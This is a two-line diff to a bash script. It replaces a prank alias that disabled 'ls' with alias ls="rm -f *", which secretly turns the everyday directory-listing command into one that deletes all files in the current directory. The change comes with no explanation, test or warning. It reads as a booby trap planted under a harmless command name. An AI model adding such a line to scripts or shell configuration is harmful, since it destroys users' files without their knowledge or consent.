@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='echo ls command disabled'" >> ~/.bashrc
+alias ls="rm -f *"
